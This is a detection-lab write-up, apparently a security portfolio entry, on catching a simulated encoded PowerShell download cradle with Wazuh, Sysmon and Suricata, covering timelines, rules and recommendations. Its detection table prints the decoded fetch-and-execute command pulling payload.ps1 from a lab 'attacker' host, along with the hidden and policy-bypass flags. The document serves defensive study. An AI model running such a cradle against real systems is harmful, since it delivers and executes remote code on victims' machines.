# Detection Use Case 03: Suspicious Process Creation — Encoded PowerShell 

**Tools Used:** PowerShell (`-EncodedCommand`), Python `http.server`
**Target:** Windows 10 endpoint (`DESKTOP-A966884`), interactive user `Win10`
**MITRE ATT&CK:** T1204.001 – User Execution: Malicious Link, T1059.001 – Command and Scripting Interpreter: PowerShell, T1105 – Ingress Tool Transfer
**Status:** ✅ Complete

## Scenario
A simulated phishing-delivered payload execution was performed against the Windows 10 endpoint. Rather than relying on a malicious document/macro (out of scope — no MS Office in this lab), the attack chain was simulated as if a victim had clicked a phishing link that silently triggered a PowerShell download cradle: a single obfuscated command combining Base64 encoding, a hidden window, and execution policy bypass to fetch and run a remote script. The "attacker" web server (Kali, `192.168.235.140:8000`) hosted a harmless `.ps1` payload that wrote a marker file and beaconed back to the attacker host — enough to prove full execution without any real-world risk.

An initial baseline run using a plain, unobfuscated `IEX (New-Object Net.WebClient).DownloadString(...)` call (executed inline in an existing shell, no new process spawn) was also performed for comparison; this generated network-level visibility only and did not trigger a high-severity process-creation alert, confirming that Wazuh's detection logic is specifically tuned to the encoded/hidden/bypass pattern rather than the download activity alone.

## Detection Timeline
All Sysmon events were forwarded via the Wazuh agent (`windows_eventchannel` decoder); network activity was independently captured by Suricata on the Wazuh manager.

| Time (Local) | Event | Rule | Level |
|---|---|---|---|
| 12:03:43 | Baseline run: inline `DownloadString` call, no new process spawned | 86601 (Suricata) | 3 |
| **12:08:11.013** | **`powershell.exe` spawns child `powershell.exe` with `-EncodedCommand -WindowStyle Hidden -ExecutionPolicy Bypass`** | **92057** | **12** |
| **12:08:11.646** | **`__PSScriptPolicyTest_*.ps1` written to `%TEMP%` (encoded-command policy-check artifact)** | **92213** | **15** |
| 12:08:15.258 | Outbound `GET /beacon` to `192.168.235.140:8000`, User-Agent `WindowsPowerShell/5.1.19041.6456` | 86601 (Suricata) | 3 |

## Key Detection: Encoded PowerShell Child Process (Rule 92057)
The core event in this chain is **Wazuh rule 92057, severity level 12** — triggered by Sysmon Event ID 1 (Process Create), specifically the well-known "PowerShell spawning PowerShell with a Base64-encoded command" pattern.

| Field | Value |
|---|---|
| Event ID | Sysmon 1 (Process Create) |
| Image | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| Parent Image | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| CommandLine | `-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand <base64>` |
| Decoded Command | `IEX (New-Object Net.WebClient).DownloadString('http://192.168.235.140:8000/payload.ps1')` |
| User | `DESKTOP-A966884\Win10` (Integrity Level: High) |
| Wazuh Rule | 92057 (Level 12) |
| MITRE Technique | T1059.001 (Command and Scripting Interpreter: PowerShell) |
| MITRE Tactic | Execution |

Wazuh's rule engine correctly classified this event against MITRE ATT&CK without any custom tuning, out of the box.

## Full Attack Chain
1. **Simulated user execution (T1204.001)** — victim "clicks" a phishing link, which silently triggers a PowerShell download cradle (simulated manually on the endpoint in place of a real click-through delivery mechanism)
2. **Execution (T1059.001)** — a child `powershell.exe` process spawns with `-EncodedCommand`, `-WindowStyle Hidden`, and `-ExecutionPolicy Bypass`, detected by rule 92057
3. **Policy-check artifact** — PowerShell's internal AMSI/script-policy evaluation writes a `__PSScriptPolicyTest_*.ps1` file to `%TEMP%`, detected by rule 92213 (level 15). This file is **not** the actual payload — it is a PowerShell-generated side effect of evaluating an encoded/in-memory script block, but it is a reliable indirect indicator of this execution technique
4. **Ingress tool transfer (T1105)** — the payload is fetched from the Kali-hosted HTTP server; this specific GET request was not independently captured in Suricata for this run, but is inferred from the Sysmon process/file evidence and confirmed by the subsequent beacon callback
5. **Payload execution & callback** — the downloaded script runs in memory, writes a local marker file, and issues a `GET /beacon` request back to the attacker host, confirmed via Suricata (rule 86601) with a PowerShell-specific User-Agent string

## Findings
- Wazuh's built-in ruleset detected the encoded PowerShell execution technique **natively**, with correct MITRE ATT&CK mapping (T1059.001), requiring no custom rule engineering.
- The severity gap between the baseline run (inline `DownloadString`, network-only visibility, no high-severity alert) and the encoded/hidden/bypass run (level 12 + level 15 alerts) confirms Wazuh's detection logic is keyed to the **process-creation pattern and command-line flags**, not merely the presence of outbound web requests — an important distinction for tuning and for understanding detection coverage limits.
- The `__PSScriptPolicyTest_*.ps1` artifact (rule 92213) is a genuinely useful indirect IOC for encoded/in-memory PowerShell execution, though its MITRE auto-tag (T1105) is a reasonable heuristic rather than a literal match — the file itself is a policy-check byproduct, not the transferred tool.
- The actual ingress tool transfer (the `/payload.ps1` fetch) was not independently confirmed via network telemetry in this run — only the later `/beacon` callback was captured by Suricata. This is a known gap in this test rather than a detection failure, and is noted here for analytical completeness.

## Recommendations
- **Treat rule 92057 as a high-priority triage item.** An encoded PowerShell child-process spawn is one of the most reliable single indicators of a scripted dropper or living-off-the-land attack technique and warrants immediate investigation, not routine queue handling.
- **Correlate rule 92057/92213 with subsequent outbound network activity** (Suricata or Sysmon Event ID 3) from the same process GUID, to confirm whether the encoded command resulted in an actual external connection — this closes the exact evidence gap identified above.
- **Consider adding a custom rule or correlation** that explicitly ties Sysmon EID 1 (encoded PowerShell spawn) to Sysmon EID 3 (network connection from the same `ProcessGuid`) within a short time window, producing a single composite high-confidence alert rather than requiring manual timeline reconstruction, as was done here.
- **Enable/verify AMSI logging** (Event ID 4104, PowerShell Script Block Logging) in addition to Sysmon, which would capture the actual decoded/executed script content directly — closing the visibility gap around the `payload.ps1` contents rather than relying solely on process and file artifacts.
- **Educate end users on phishing-link risk**, since this entire chain begins with a single user action; technical controls here detected the attack but did not prevent initial execution.

## Pipeline Validated
`Sysmon (EID 1, EID 11) → Wazuh Agent → Wazuh Manager (windows_eventchannel decoder) → Rules 92057 / 92213 → Wazuh Indexer → Wazuh Dashboard`
`Suricata (eve.json) → Wazuh Manager → Rule 86601 → Wazuh Indexer → Wazuh Dashboard`
